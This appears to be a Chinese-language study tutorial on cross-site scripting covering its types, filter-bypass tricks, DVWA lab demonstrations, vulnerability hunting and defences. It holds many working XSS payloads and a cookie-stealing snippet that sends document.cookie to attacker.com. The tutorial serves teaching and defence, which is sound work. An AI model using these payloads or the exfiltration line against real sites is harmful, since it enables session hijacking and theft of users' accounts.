## XSS 跨站脚本攻击

### 什么是XSS

XSS（Cross Site Scripting），跨站脚本攻击。是一种利用浏览器特性和动态网页内容进行的注入攻击，静态网页则完全不受影响。XSS原本应当简写为CSS，但与层叠样式表（CSS）同名，为了区分则取名XSS

### XSS的原理及危害

XSS是一种注入攻击，恶意用户将恶意代码注入到网页内容中，其它用户正常打开网站时，浏览器接收到内容后自动执行。XSS攻击可以绕过浏览器同源策略，从而窃取用户的Cookie，劫持用户的Web行为，还可以结合CSRF（跨站请求伪造）进行针对性的攻击

### XSS的分类

根据XSS的传播方式和触发原理，XSS通常分为三类，分别是：`反射型`、`存储型`、`DOM型`

#### 反射型XSS

反射型XSS特点是攻击只有一次，通常出现在搜索框、登录页面等用户输入内容会被立即回显的位置

反射型XSS中，XSS攻击脚本出现在URL中，作为用户输入提交给服务器，服务器解析后返回响应，而用户的浏览器接收响应时XSS脚本执行，会经过一次在服务器端的反射，所以称之为反射型XSS

**特点**

- XSS脚本不会被服务器储存，仅在一次请求-响应中生效
- 需要用户主动点击攻击者构造的恶意链接
- 常用于窃取Cookie或进行钓鱼欺骗

**利用反射型XSS的前提**

- 用户主动点击恶意链接
- 目标网站存在反射型XSS漏洞，在页面中回显了未转义的用户输入

#### 存储型XSS

顾名思义，存储型XSS是将恶意脚本存储在了服务器中，可以是数据库、日志或其它持久化介质中，只要能够被其它用户访问就能够加载和执行

存储型XSS常见于论坛、博客等网站的讨论区、留言板中。攻击者在发帖过程中将恶意脚本连同正常的信息一并注入到帖子内容中，服务器永久储存内容，其它用户浏览时，浏览器自动获取并执行，达到攻击目的

**特点**

- 常见于留言板、评论系统、论坛帖子、用户签名等交互区域
- 管理员、用户浏览内容自动触发
- 服务器永久储存，危害范围大，攻击持久，难以察觉

#### DOM型XSS

DOM型XSS是基于浏览器中的文档对象模型（DOM）进行的一种攻击方式，与反射型XSS类似，脚本注入与执行只发生在客户端，服务器不直接参与

**特点**

- 攻击入口仍然通过URL参数传递
- 服务端响应的HTML是干净的，恶意脚本在浏览器解析DOM时动态执行
- 主要依赖客户端JavaScript中的不安全操作（如`document.write()`、`innerHTML`、`eval()`等）

### 过滤绕过

#### 上下文感知绕过

- HTML标签内

  当输出点在HTML标签属性时，如`<input value="...">`，可以提前闭合引号并注入新事件

  ```lisp
  " onmouseover="alert(1)
  ```

- JavaScript中

  当输出在JavaScript的`<script>`标签内，需要考虑使用闭合字符串或利用模板字符串，如`var name = '用户输入'`，如果输入`';alert(1);`就可以绕过

#### 编码绕过

- HTML实体编码

  某些过滤仅检查`<`和`>`，但浏览器在解析HTML属性时会先解码

  ```xml
  <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
  ```

- Unicode/URL编码

  在 `javascript:` 伪协议或 `data:` 中使用

- 多重编码

  针对递归解码的过滤器，使用两次URL编码
  
  可以结合`eval()`
  
  ```html
  <script>eval('a\u006cert(1)')</script>
  ```

#### 事件与伪协议

- HTML5新事件

  `onload`、`onerror`、`onfocus`、`onpointermove`等

- 伪协议

  比如

  ```xml
  <a href="javascript:alert(1)">click</a>
  <iframe src="javascript:alert(1)">
  ```

- `<svg>`与`<math>`标签

  这些标签内容允许脚本且对过滤宽松

  ```xml
  <svg><script>alert(1)</script>
  ```

#### 过滤检测对抗

- 大小写混合

  例如`<ScRiPt>`绕过黑名单

- 双写绕过

  例如`<scr<script>ipt>`，当过滤`<script>`仅删除一次时绕过

- 利用换行与空格

  `<script \n src="...">`某些正则可能遗漏

- 字符截断

  使用`%00`、`/`或Unicode控制字符干扰正则匹配
  
- 替换点操作符`.`

  ```html
  <script>alert(document['cookie'])</script>
  
  <script>with(document)alert(cookie)</script>
  ```

### 攻击示例

#### URL参数注入

这里我们利用**DVWA**作示例，使用DVWA的XSS (Reflected)页面

![image-20260415162559762](./img/image-20260415162559762.png)

输入一个名字，前端就会回显我们的输入

![image-20260415162640649](./img/image-20260415162640649.png)

并且通过URL传递参数，回显在前端，典型的反射型XSS漏洞

![image-20260415162725252](./img/image-20260415162725252.png)

![image-20260415163653507](./img/image-20260415163653507.png)

构造

```
http://dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>#
```

然后我们模仿倒霉蛋，使用浏览器访问我们的链接，即可实现反射型XSS攻击

![image-20260415164507884](./img/image-20260415164507884.png)

查看前端源码，可以看到脚本被注入到了前端源码中

![image-20260415164528655](./img/image-20260415164528655.png)

#### 存储型

![image-20260415164822588](./img/image-20260415164822588.png)

DVWA的存储型XSS页面还原了一个留言板功能，我们可以在此输入名称和留言

![image-20260415165017411](./img/image-20260415165017411.png)

![image-20260415165105687](./img/image-20260415165105687.png)

POST提交给服务器永久储存，我们直接输入`<script>alert('XSS')</script>`

![image-20260415165300276](./img/image-20260415165300276.png)

点击提交后，页面自动刷新一次，脚本也成功执行

![](./img/image-20260415164507884.png)

👆这里的图片用的是反射型XSS执行成功的图片，所以可以在URL中看到脚本

*~~主要是懒得截新图~~*

![image-20260415165824694](./img/image-20260415165824694.png)

成功注入到前端代码中

错误信息回显是一样的原理，只要是未进行HTML转义的输入都有XSS的危害

#### HTTP请求头注入

例如修改请求头字段

```
User-Agent: <script>alert('XSS')</script>
```

或者是其它字段

```
referer: "type="test" onclick="alert('test')
```

如果后台记录日志，管理员浏览时就会触发XSS

#### 窃取Cookie

XSS很重要的利用方式就是窃取用户的Cookie后配合CSRF进行攻击

```html
<script>
  new Image().src = "http://attacker.com/log?c=" + document.cookie;
</script>
```

 ### 漏洞查找

#### 反射型

##### 常见注入位置与方法

**标签属性值**

假设前端返回有以下形式

```html
<input type="text" name="name" value="test-text">
```

接收值`test-text`，则可以构造

```
"><script>alert(1)</script>
```

**JavaScript字符串**

```
<script>var a='test-text';</script>
```

注入构造

```
';alert(1);var b='
```

`var b='`是防止后面的单引号闭合错误

**URL属性**

```
<a href="test-text">Click here</a>
```

也可以算是一种标签属性

```
<a href="javascript:alert(1)">Click here</a>
```

##### 利用常见标签和属性触发脚本执行

**常见无需用户交互的事件属性**

```
<img src=# onerror=alert("xss")>

<style onreadystatechange=alert(1)></style>

<iframe onreadystatechange=alert(1)></iframe>

<object onerror=alert(1)></object>

<img src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<body onbeforeactivate=alert(1)></body>

<video src=1 onerror=alert(1)></video>

<audio src=1 onerror=alert(1)>
```

**脚本伪协议注入**

```
<object data="javascript:alert(1)"></object>

<iframe src="javascript:alert(1)"></iframe>

<event-source src="javascript:alert(1)"></event-source>
```

#### 存储型

提交恶意字符串后，检查网站内的每个页面和功能，看是否有XSS漏洞

如果应用程序有管理员访问区域，有可能记录日志，可以通过日志注入XSS加以利用

同时还要检查所有可控的带外通道，如HTTP消息头等

#### DOM型

DOM型XSS的主要原因是危险DOM属性和API，最好的查找办法是进行代码审计

**需要关注的DOM属性**

- `document.location`

- `document.URL`

- `document.URLUnencoded`

- `document.referrer`

- `window.location`

**危险的JavaScript操作**

- `document.write()`

- `document.writeln()`

- `document.body.innerHTML`

- `eval()`

- `window.execScript()`

- `window.setInterval()`

- `window.setTimeout()`

### 漏洞防御

反射型与存储型 XSS 漏洞的根本原因在于将用户可控的数据未经适当的过滤就直接复制到应用程序的响应中，被浏览器自动解析执行

#### 输入验证

防御XSS的第一步就是输入验证，验证用户输入的合法性，拒绝相信用户输入的任何数据

尽量做到前端和后端双重验证

#### 输出验证

确保在响应中对用户输入的数据进行HTML编码，防止被当作HTML或JavaScript代码执行

某些论坛或博客支持允许用户以HTML格式提交数据，这种情况下，应该使用专门的框架来确认用户提交的HTML标签不含可能执行的恶意脚本